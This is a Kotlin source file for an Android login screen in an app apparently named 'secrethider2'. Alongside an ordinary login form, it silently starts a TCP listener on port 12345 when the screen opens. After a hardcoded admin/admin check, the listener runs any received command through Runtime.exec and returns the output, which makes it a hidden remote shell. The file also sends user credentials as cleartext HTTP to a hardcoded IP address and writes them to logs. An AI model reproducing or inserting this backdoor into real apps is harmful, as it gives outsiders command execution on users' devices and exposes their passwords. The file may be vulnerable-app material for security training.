package com.example.secrethider2

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintWriter
import java.io.IOException
import java.net.ServerSocket
import java.net.Socket
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody

class LoginActivity : AppCompatActivity() {

    private lateinit var editTextUsername: EditText
    private lateinit var editTextPassword: EditText
    private lateinit var buttonLogin: Button
    private lateinit var buttonRegister: Button

    private val client = OkHttpClient()
    private val port = 12345
    private val username = "admin"
    private val password = "admin"
    private var serverSocket: ServerSocket? = null
    private var isServiceRunning = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_login)

        // Initialize views
        editTextUsername = findViewById(R.id.editTextUsername)
        editTextPassword = findViewById(R.id.editTextPassword)
        buttonLogin = findViewById(R.id.buttonLogin)
        buttonRegister = findViewById(R.id.buttonRegister)

        // Start the remote service when the application opens
        startRemoteService()

        // Set up login button click listener
        buttonLogin.setOnClickListener {
            val username = editTextUsername.text.toString()
            val password = editTextPassword.text.toString()

            if (username.isNotEmpty() && password.isNotEmpty()) {
                Log.d("LoginActivity", "Attempting to login with username: $username")
                loginUser(username, password)
            } else {
                Toast.makeText(this, "Please fill in all fields", Toast.LENGTH_SHORT).show()
            }
        }

        // Set up register button click listener to navigate to RegisterActivity
        buttonRegister.setOnClickListener {
            val intent = Intent(this, RegisterActivity::class.java)
            startActivity(intent)
        }
    }

    /**
     * Starts the remote service by initializing a ServerSocket on the specified port.
     * It listens for incoming client connections in a coroutine.
     */
    private fun startRemoteService() {
        if (isServiceRunning) return // Ensure the service is only started once
        Log.d("LoginActivity", "Starting the remote service on port $port")
        isServiceRunning = true

        // Start the server in a coroutine
        CoroutineScope(Dispatchers.IO).launch {
            try {
                serverSocket = ServerSocket(port)
                Log.d("LoginActivity", "Server started on port $port")

                // Keep accepting client connections while the service is running
                while (isServiceRunning) {
                    val clientSocket = serverSocket?.accept()
                    Log.d("LoginActivity", "Client connected: ${clientSocket?.inetAddress}")

                    clientSocket?.let {
                        handleClientConnection(it)
                    }
                }
            } catch (e: Exception) {
                Log.e("LoginActivity", "Error while running the server: ${e.message}")
            }
        }
    }

    /**
     * Handles client connections by prompting for credentials and executing commands.
     */
    private fun handleClientConnection(clientSocket: Socket) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val input = BufferedReader(InputStreamReader(clientSocket.getInputStream()))
                val output = PrintWriter(clientSocket.getOutputStream(), true)

                // Request and log username and password inputs
                output.println("Enter username:")
                val userInput = input.readLine()
                Log.d("LoginActivity", "Received username: $userInput")

                output.println("Enter password:")
                val passInput = input.readLine()
                Log.d("LoginActivity", "Received password for username $userInput")

                if (userInput == username && passInput == password) {
                    Log.d("LoginActivity", "Access granted for user: $userInput")
                    output.println("Access granted. Welcome to the Mobile Remote Manager.")

                    output.println("You can now enter commands. Type 'exit' to disconnect.")

                    var command: String?
                    while (isServiceRunning && clientSocket.isConnected) {
                        output.print("RemoteDeviceManager> ")
                        command = input.readLine()

                        if (command == null || command.lowercase() == "exit") {
                            output.println("Disconnecting from the server.")
                            break
                        }

                        // Execute the command and send back the output
                        val commandOutput = executeSystemCommand(command)
                        output.println(commandOutput)
                    }
                } else {
                    Log.d("LoginActivity", "Access denied for user: $userInput")
                    output.println("Access denied. Invalid credentials.")
                }
                clientSocket.close()
                Log.d("LoginActivity", "Client connection closed: ${clientSocket.inetAddress}")
            } catch (e: Exception) {
                Log.e("LoginActivity", "Error handling client connection: ${e.message}")
            }
        }
    }

    /**
     * Executes a system command received from the client.
     */
    private fun executeSystemCommand(command: String): String {
        return try {
            val process = Runtime.getRuntime().exec(command)
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = StringBuilder()
            reader.forEachLine { output.append(it).append("\n") }
            process.waitFor() // Wait for the command to complete

            Log.d("LoginActivity", "Executed command: $command\nOutput: $output")
            output.toString()
        } catch (e: Exception) {
            Log.e("LoginActivity", "Error executing command: ${e.message}")
            "Error executing command: ${e.message}"
        }
    }

    private fun loginUser(username: String, password: String) {
        val url = "http://45.33.102.27:5000/login"
        val json = JSONObject()
        json.put("username", username)
        json.put("password", password)

        val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        Log.d("LoginActivity", "Sending login request to $url with body: $json")

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("LoginActivity", "Login request failed: ${e.message}")
                runOnUiThread {
                    Toast.makeText(this@LoginActivity, "Login failed", Toast.LENGTH_SHORT).show()
                }
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    val responseBody = response.body
                    val responseString = responseBody?.string() ?: ""
                    responseBody?.close()

                    Log.d("LoginActivity", "Login response body: $responseString")
                    val jsonResponse = JSONObject(responseString)
                    val userId = jsonResponse.optInt("user_id", -1)

                    runOnUiThread {
                        if (userId != -1) {
                            Toast.makeText(this@LoginActivity, "Login successful", Toast.LENGTH_SHORT).show()
                            val intent = Intent(this@LoginActivity, ProfileActivity::class.java)
                            intent.putExtra("user_id", userId)
                            startActivity(intent)
                            finish()
                        } else {
                            Toast.makeText(this@LoginActivity, "Failed to retrieve user ID", Toast.LENGTH_SHORT).show()
                        }
                    }
                } else {
                    runOnUiThread {
                        Toast.makeText(this@LoginActivity, "Login failed: ${response.message}", Toast.LENGTH_SHORT).show()
                    }
                }
            }
        })
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("LoginActivity", "Activity destroyed, stopping service if running")
        isServiceRunning = false
        serverSocket?.close()
    }
}
